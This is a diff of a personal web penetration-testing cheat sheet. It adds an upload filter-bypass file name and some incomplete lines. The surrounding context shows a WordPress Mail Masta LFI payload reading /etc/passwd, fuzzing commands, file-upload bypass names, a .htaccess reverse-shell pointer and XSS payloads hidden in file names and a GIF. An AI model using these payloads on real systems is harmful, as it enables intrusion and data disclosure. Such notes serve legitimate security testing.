@@ -50,7 +50,7 @@ Wordpress
 	
 9- url": "https://wpscan.com/vulnerability/bb20d732-a5e4-4140-ab51-b2aa1a53db12"	
 10- http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
-	
+11- 
 
 -----------------------------------------------------------------------------------------------------
 Automatic scanners 
@@ -125,6 +125,7 @@ Directory Enumeration
 1- Gobuster => gobuster dir -u target.com:port -w /home/hossam/wordlists/api.txt
 2- gobuster dir -u target.com:port -w /home/hossam/wordlists/raft-small-words.txt
 	- gobuster dir -w Seclists/Discovery/Web-Content/raft-small-word.txt
+	- gobuster fuzz -w 
 	-  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 	-https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters	=> parameters
 	-list ==> https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
@@ -1009,6 +1010,7 @@ alert(11);
 	file.php#.png
 	file.
 	.html
+	file.php%2500.pdf
 25- upload .htaccess file 	==> can make reverse shell >https://github.com/wireghoul/htshells
 26- Set file name filename="svg onload=alert(document.domain)>" , filename="58832_300x300.jpg<svg onload=confirm()>"
 27- GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;		=> file.gif
